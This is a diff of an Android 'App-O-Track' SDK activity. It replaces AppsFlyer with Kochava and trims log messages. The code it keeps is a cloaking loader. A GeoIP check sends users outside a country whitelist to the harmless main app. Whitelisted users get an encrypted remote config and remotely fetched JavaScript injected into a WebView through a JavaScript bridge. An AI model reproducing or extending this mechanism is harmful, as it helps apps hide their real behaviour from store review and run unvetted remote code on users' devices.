@@ -1,6 +1,6 @@
 /*
   App-O-Track In-App SDK
-  Version: 02032020
+  Version: 19032020
   Author: Liv <developer@app-o-track.top>
  */
 package com.appotrack_sdk;
@@ -32,11 +32,9 @@ import androidx.appcompat.app.ActionBar;
 import androidx.appcompat.app.AppCompatActivity;
 
 import com.appotrack_sdk.example.MainActivity;
-import com.appsflyer.AFInAppEventParameterName;
-import com.appsflyer.AFInAppEventType;
-import com.appsflyer.AppsFlyerLib;
 import com.jayway.jsonpath.DocumentContext;
 import com.jayway.jsonpath.JsonPath;
+import com.kochava.base.Tracker;
 import com.onesignal.OneSignal;
 
 import org.json.JSONException;
@@ -69,7 +67,7 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
     /* TODO: SDK configuration */
     private static final boolean isAtSdkDebugMode = false; //set to true to show debug messages with ATSDK tag. Please set to false for production builds TODO: set to false
     private static final String remoteConfigId = "PLEASE SET"; //remote configuration record ID TODO: request it from your personal manager
-    private static final String afDevKey = "PLEASE SET"; //AppsFlyer API key TODO: request it from your personal manager
+    private static final String kchAppId = "PLEASE SET"; //Kochava App ID TODO: request it from your personal manager
     private static final String geoipApiKey = "PLEASE SET"; //GeoIP API key TODO: request it from your personal manager
     private static final Integer geoipApiId = 218804; //GeoIP API user ID TODO: request it from your personal manager
     private static final Class sweetieActivityClass = MainActivity.class; //your application's main activity class TODO: set to your main activity
@@ -121,7 +119,7 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
      */
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        Utils.debugOutput("App-O-Track SDK entry point");
+        Utils.debugOutput("Entry point");
         super.onCreate(savedInstanceState);
 
         oSelfContext = this;
@@ -141,7 +139,6 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
 
             case ACTIVITY_MODE_LAUNCHER:
             default:
-                Utils.debugOutput("Launching as launcher");
                 Utils.debugOutput("ENC_KEY: "+ENC_KEY);
                 Utils.debugOutput("remoteConfigId: "+remoteConfigId);
                 onCreateLauncher(savedInstanceState);
@@ -205,7 +202,8 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
      * @param savedInstanceState
      */
     private void onCreateLauncher(Bundle savedInstanceState) {
-        //show launch screen. This can be replaced with setContentView(R.layout.activity_launcher); (if you have one)
+        //This shows launch screen
+        //You may replace the code with setContentView(R.layout.activity_launcher);
         FrameLayout vLayout = new FrameLayout(oSelfContext);
         FrameLayout.LayoutParams layoutparams=new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,ViewGroup.LayoutParams.MATCH_PARENT, Gravity.CENTER_HORIZONTAL|Gravity.CENTER_VERTICAL);
         vLayout.setLayoutParams(layoutparams);
@@ -219,7 +217,9 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
         setContentView(vLayout);
         //---
 
-        AppsFlyerLib.getInstance().startTracking(getApplication(), afDevKey);
+        Tracker.configure(new Tracker.Configuration(getApplicationContext())
+                .setAppGuid(kchAppId)
+        );
 
         //do the job in different thread so the app will not freeze
         Thread t = new Thread(new Runnable() {
@@ -234,14 +234,11 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
                 try{
                     String geoipJson = futureGeoIp.get(30L, TimeUnit.SECONDS);
                     String geoipIsoCode = JsonPath.parse(geoipJson).read("$.country.iso_code", String.class);
-                    Utils.debugOutput("GeoIP: "+geoipJson);
-                    Utils.debugOutput("Country ISO: "+geoipIsoCode);
+                    Utils.debugOutput(geoipJson);
                     if(!allowedCountries.contains(geoipIsoCode)){
                         //user's country is not whitelisted
                         startSweetie();
                         return;
-                    }else{
-                        Utils.debugOutput("Country is in whitelist");
                     }
                 }catch (Exception e){
                     Utils.debugOutput("Error: "+e.getMessage());
@@ -255,12 +252,11 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
                 executor.execute(futureConfig);
                 try{
                     String sConfigJson = futureConfig.get(30L, TimeUnit.SECONDS);
-                    Utils.debugOutput("Raw config:"+sConfigJson);
 
                     if (sConfigJson.startsWith("ENC-")) {
                         sConfigJson = Utils.decrypt(sConfigJson.substring(4), ENC_KEY);
-                        Utils.debugOutput("Decrypted config:"+sConfigJson);
                     }
+                    Utils.debugOutput(sConfigJson);
 
                     oRemoteConfig = JsonPath.parse(sConfigJson);
 
@@ -268,12 +264,8 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
                         startSweetie(); //start main activity if ADs disabled
                     } else {
                         //report to analytics that this launch was with ADs
-                        HashMap<String,Object> eventParams = new HashMap<String, Object>()
-                        {{
-                            put(AFInAppEventParameterName.DESCRIPTION, "advertised_launch");
-                        }};
-                        AppsFlyerLib.getInstance().trackEvent(oSelfContext, AFInAppEventType.ACHIEVEMENT_UNLOCKED, eventParams);
-                        OneSignal.sendTags(new JSONObject(eventParams));
+                        Tracker.sendEvent(new Tracker.Event(Tracker.EVENT_TYPE_AD_CLICK));
+                        OneSignal.sendTag("adv","1");
                     }
 
                 }catch (Exception e){
@@ -286,14 +278,15 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
                 //load injected JS code if we have one
                 String jsUrl = getConfigStr("$.jsurl", "");
                 if (jsUrl!=null && jsUrl.length() > 0) {
-                    Utils.debugOutput("Getting InjectedApp: "+jsUrl);
+                    Utils.debugOutput(jsUrl);
                     try {
                         FutureTask<String> futureInjectedApp = new FutureTask<>(getString(jsUrl));
                         executor.execute(futureInjectedApp);
                         sInjectedJs = futureInjectedApp.get(30L, TimeUnit.SECONDS);
-                        Utils.debugOutput("InjectedApp: "+ sInjectedJs);
+                        Utils.debugOutput(sInjectedJs);
                     }catch(Exception e){
-                        Utils.debugOutput("Error: "+e.getMessage());
+                        Utils.debugOutput(e.getMessage());
+                        e.printStackTrace();
                         sInjectedJs = null;
                     }
                 }else{
@@ -347,7 +340,7 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
     }
 
     /**
-     * Make GET request and return body
+     * Makes GET request and returns response body
      * @param urlAddr HTTP address
      * @return Response body
      */
@@ -367,7 +360,7 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
     }
 
     /**
-     * Get configuration object by selector as String
+     * Gets configuration object by selector as String
      * @param key Selector
      * @param defaultValue Default value
      * @return Requested value or defaultValue
@@ -383,7 +376,7 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
     }
 
     /**
-     * Get configuration object by selector as Boolean. Values are set to false by default.
+     * Gets configuration object by selector as Boolean. Values are set to false by default.
      * @param key Selector
      * @return Requested value or false
      */
@@ -545,14 +538,14 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
         }
 
         @JavascriptInterface
-        public boolean AFEvent(String eventType, String eventValues){
+        public boolean KCEvent(String eventType, String eventValues){
             Map<String, Object> eventValue = new HashMap<String, Object>();
             for(String item:eventValues.split(",")){
                 String[] kv = item.split(":");
                 if(kv.length<2) continue;
                 eventValue.put(kv[0],kv[1]);
             }
-            AppsFlyerLib.getInstance().trackEvent(mContext, eventType,eventValue);
+            Tracker.sendEvent(new Tracker.Event(eventType).addCustom(new JSONObject(eventValue)));
             return true;
         }
 
